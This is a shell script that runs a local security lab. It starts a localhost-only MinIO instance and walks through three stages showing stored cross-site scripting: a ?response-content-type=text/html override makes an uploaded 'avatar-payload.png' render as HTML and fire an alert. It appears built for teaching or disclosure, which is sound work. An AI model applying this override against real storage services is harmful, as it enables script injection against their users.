#!/usr/bin/env bash
# One-shot lab runner: bring MinIO up, initialize the public bucket and the
# forced-Content-Type uploads, then walk through the three stages of the lab.
set -euo pipefail
cd "$(dirname "$0")/.."

echo "[*] Starting MinIO (bound to 127.0.0.1 only)..."
docker compose up -d

echo "[*] Waiting for bucket initialization..."
for i in $(seq 1 60); do
  if docker compose logs setup 2>/dev/null | grep -q "LAB-READY"; then
    break
  fi
  sleep 2
  if [ "$i" -eq 60 ]; then
    echo "[!] setup did not finish in time:"
    docker compose logs setup | tail -n 20
    exit 1
  fi
done

docker compose logs setup 2>/dev/null | grep -v "^$" | tail -n 8

echo
echo "=============================================================="
echo " Stage 1 - baseline GET (the uploader's forced Content-Type)"
echo "=============================================================="
./scripts/01-baseline-get.sh

echo
echo "=============================================================="
echo " Stage 2 - ?response-content-type=text/html (the override)"
echo "=============================================================="
./scripts/02-content-type-override.sh

echo
echo "=============================================================="
echo " Stage 3 - verify the stored bytes now serve as attackable HTML"
echo "=============================================================="
./scripts/03-verify-stored-xss.sh

echo
echo "Done. Open in a browser to see the alert fire:"
echo "  http://127.0.0.1:9000/public/avatar-payload.png?response-content-type=text/html"
echo
echo "Teardown: docker compose down -v"
